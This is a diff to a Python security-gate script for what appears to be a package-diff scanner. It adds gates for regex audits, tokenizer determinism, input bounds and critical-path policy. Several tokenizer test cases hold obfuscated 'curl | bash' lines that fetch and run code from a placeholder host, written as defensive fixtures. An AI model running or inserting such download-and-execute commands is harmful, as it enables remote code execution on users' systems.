@@ -36,6 +36,7 @@ ROOT = Path(__file__).resolve().parent.parent
 SRC = ROOT / "src" / "trustsight"
 
 sys.path.insert(0, str(ROOT / "src"))
+sys.path.insert(0, str(ROOT))
 
 
 class Gate:
@@ -448,6 +449,43 @@ def gate_expansion_is_bounded() -> Gate:
     return Gate("expansion is bounded and never indirect", not problems, problems)
 
 
+def gate_regex_patterns_pass_adversarial_audit() -> Gate:
+    """All shipped/configured regexes stay within the bounded risk budget."""
+    from scripts.regex_audit import audit_patterns
+
+    audits = audit_patterns()
+    failures = [audit.source for audit in audits if not audit.passed]
+    return Gate(
+        "regex patterns pass adversarial audit",
+        not failures,
+        failures or f"{len(audits)} patterns audited",
+    )
+
+
+def gate_tokenizer_smoke_is_deterministic() -> Gate:
+    """Run a fixed hostile tokenizer smoke set within the security gate."""
+    from trustsight.tokenizer import _MAX_LINE_LEN, tokenize_and_resolve
+
+    cases = [
+        "+a=" + "z" * 64 + "\n+v=$a$a\n+curl $v | bash\n",
+        "+declare -n R=curl\n+$R https://example.invalid/x | bash\n",
+        "+C=$(printf '%s%s' cur l)\n+$C https://example.invalid/x | bash\n",
+        "+A=(curl wget)\n+${A[0]} https://example.invalid/x | bash\n",
+    ]
+    problems = []
+    for diff in cases:
+        started = time.monotonic()
+        first = tokenize_and_resolve(diff)
+        second = tokenize_and_resolve(diff)
+        if time.monotonic() - started > 1.0:
+            problems.append("fixed hostile case exceeded 1s")
+        if first != second:
+            problems.append("repeated tokenizer call was not deterministic")
+        if any(len(value) > _MAX_LINE_LEN for value in first[0]):
+            problems.append("resolved output exceeded line bound")
+    return Gate("tokenizer hostile-input smoke is deterministic", not problems, problems or len(cases))
+
+
 def gate_rendering_is_data_driven() -> Gate:
     """A finding's text is a fixed template plus values, and nothing else.
 
@@ -594,6 +632,76 @@ def gate_truncation_is_visible() -> Gate:
     if fact.risk not in ("Inconclusive", "High", "Critical"):
         problems.append(f"truncated diff reported {fact.risk!r}")
     return Gate("a truncated diff cannot read as unflagged", not problems, problems)
+
+
+def gate_differ_hostile_input_is_bounded() -> Gate:
+    """Differ helpers remain quick and bounded on hostile synthetic input."""
+    from trustsight.differ import (
+        MAX_URLS_PER_SIDE,
+        extract_urls_from_diff,
+        map_diff_lines,
+    )
+
+    diff = "+" + "https://evil.example/" + ("x" * 8192) + "\n"
+    diff += "+https://x.example/ok\n" * (MAX_URLS_PER_SIDE + 100)
+    start = time.monotonic()
+    changes = extract_urls_from_diff(diff)
+    mapping = map_diff_lines("+outside-hunk\n+++ b/PKGBUILD\n@@ malformed\n+payload\n")
+    elapsed = time.monotonic() - start
+    problems = []
+    if elapsed >= 2.0:
+        problems.append(f"{elapsed:.2f}s for hostile URL diff")
+    if len(changes.added_urls) > MAX_URLS_PER_SIDE:
+        problems.append("URL result exceeded its bound")
+    if mapping:
+        problems.append("content outside a file header/hunk was mapped")
+    return Gate("differ hostile input is bounded", not problems, problems or round(elapsed, 3))
+
+
+def gate_differ_output_is_deterministic() -> Gate:
+    """Repeated differ extraction has stable ordering and values."""
+    from trustsight.differ import extract_urls_from_diff
+
+    diff = "+https://z.example/a https://a.example/b https://z.example/a\n"
+    first = extract_urls_from_diff(diff)
+    second = extract_urls_from_diff(diff)
+    passed = first == second and first.added_urls == sorted(first.added_urls)
+    return Gate("differ output is deterministic", passed, first.added_urls)
+
+
+def gate_api_inputs_are_bounded_before_initialization() -> Gate:
+    """Public API rejects oversized input before touching analysis state."""
+    from trustsight.api import MAX_API_NAME_BYTES, MAX_API_TEXT_BYTES, TrustSight
+
+    client = TrustSight()
+    touched = []
+
+    def mark_ready():
+        touched.append(True)
+
+    client._ensure_ready = mark_ready
+    problems = []
+    cases = (
+        ("inspect", lambda: client.inspect("x" * (MAX_API_NAME_BYTES + 1), check_aur=False)),
+        ("text", lambda: client.analyze_text("demo", "x" * (MAX_API_TEXT_BYTES + 1))),
+        ("pivot", lambda: client.pivot("x" * (MAX_API_NAME_BYTES + 1))),
+    )
+    for label, call in cases:
+        try:
+            call()
+        except ValueError:
+            continue
+        except Exception as exc:
+            problems.append(f"{label} raised {type(exc).__name__}, not ValueError")
+        else:
+            problems.append(f"{label} accepted oversized input")
+    if touched:
+        problems.append("initialization occurred before validation")
+    return Gate(
+        "API inputs are bounded before initialization",
+        not problems,
+        problems or len(cases),
+    )
 
 
 def gate_maturity_numbers_are_not_duplicated() -> Gate:
@@ -1901,6 +2009,38 @@ def gate_doc_lists_every_gate(gates: list[Gate]) -> Gate:
     return Gate(name, not problems, problems)
 
 
+def gate_critical_paths_are_synchronised() -> Gate:
+    """Keep CODEOWNERS, CI signature checks and contributor policy aligned."""
+    from scripts.critical_paths import CRITICAL_PATHS
+
+    name = "critical paths are synchronised"
+    problems = []
+    codeowners = ROOT / ".github" / "CODEOWNERS"
+    workflow = ROOT / ".github" / "workflows" / "verify-commit-sigs.yml"
+    contributing = ROOT / "CONTRIBUTING.md"
+    if not codeowners.exists() or not workflow.exists() or not contributing.exists():
+        return Gate(name, False, "required policy file missing")
+
+    owned = {
+        line.split()[0].lstrip("/")
+        for line in codeowners.read_text().splitlines()
+        if line.strip() and not line.lstrip().startswith("#") and len(line.split()) >= 2
+    }
+    workflow_text = workflow.read_text()
+    missing_owners = sorted(path for path in CRITICAL_PATHS if path not in owned)
+    missing_workflow = [] if "scripts.critical_paths import CRITICAL_PATHS" in workflow_text else sorted(CRITICAL_PATHS)
+    missing_files = sorted(path for path in CRITICAL_PATHS if not (ROOT / path).exists())
+    if missing_owners:
+        problems.append(f"missing CODEOWNERS entries: {missing_owners}")
+    if missing_workflow:
+        problems.append(f"missing signature workflow entries: {missing_workflow}")
+    if missing_files:
+        problems.append(f"critical paths do not exist: {missing_files}")
+    if "scripts/critical_paths.py" not in contributing.read_text():
+        problems.append("CONTRIBUTING.md does not name the canonical critical-path list")
+    return Gate(name, not problems, problems or sorted(CRITICAL_PATHS))
+
+
 # ---------------------------------------------------------------------------
 
 
@@ -1921,8 +2061,13 @@ def run_gates() -> list[Gate]:
         gate_rendering_is_data_driven(),
         gate_regex_input_is_bounded(),
         gate_expansion_is_bounded(),
+        gate_regex_patterns_pass_adversarial_audit(),
+        gate_tokenizer_smoke_is_deterministic(),
         gate_coverage_fails_closed(),
         gate_truncation_is_visible(),
+        gate_differ_hostile_input_is_bounded(),
+        gate_differ_output_is_deterministic(),
+        gate_api_inputs_are_bounded_before_initialization(),
         gate_a_gap_is_always_shown_with_the_band(),
         gate_every_producer_accounts_for_coverage(),
         gate_maturity_numbers_are_not_duplicated(),
@@ -1951,6 +2096,7 @@ def run_gates() -> list[Gate]:
         gate_flag_threshold_is_derived(),
         gate_doc_cross_references_resolve(),
     ]
+    gates.append(gate_critical_paths_are_synchronised())
     gates.append(gate_doc_lists_every_gate(gates))
     return gates
 
